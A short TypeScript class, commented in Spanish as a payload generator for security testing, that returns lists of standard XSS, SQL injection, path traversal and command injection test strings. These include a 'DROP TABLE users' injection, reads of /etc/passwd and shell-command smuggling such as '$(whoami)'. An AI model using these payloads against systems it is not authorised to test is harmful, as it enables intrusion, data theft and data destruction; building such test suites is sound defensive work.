/**
 * Generador de payloads para pruebas de seguridad
 */
export class PayloadGenerator {
  static getXSSPayloads(): string[] {
    return [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      "<iframe src=\"javascript:alert('XSS')\">",
      '"><script>alert("XSS")</script>',
      '<body onload=alert("XSS")>',
    ];
  }

  static getSQLInjectionPayloads(): string[] {
    return [
      "' OR '1'='1",
      "' OR 1=1--",
      "admin'--",
      "' UNION SELECT NULL--",
      "1'; DROP TABLE users--",
      "' AND 1=0 UNION ALL SELECT 'admin', 'password'--",
    ];
  }

  static getPathTraversalPayloads(): string[] {
    return [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ];
  }

  static getCommandInjectionPayloads(): string[] {
    return ["; ls -la", "| whoami", "& dir", "`cat /etc/passwd`", "$(whoami)"];
  }
}
